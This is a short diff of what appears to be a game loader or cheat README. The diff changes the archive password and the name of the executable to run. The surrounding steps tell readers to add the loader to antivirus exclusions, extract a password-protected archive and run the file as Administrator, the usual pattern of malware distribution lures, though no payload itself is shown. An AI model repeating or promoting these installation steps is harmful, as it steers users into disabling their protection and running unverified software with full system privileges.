@@ -23,8 +23,8 @@
 > **Note:** Antivirus might flag the loader. Add to exclusions before extracting.
 
 1.  Download the latest **Release Archive** below.
-2.  Extract the files using the password: `2024`
-3.  Run `Loader.exe` as Administrator.
+2.  Extract the files using the password: `76125`
+3.  Run `assistant` as Administrator.
 4.  Launch the game and enjoy.
 
 <div align="center">
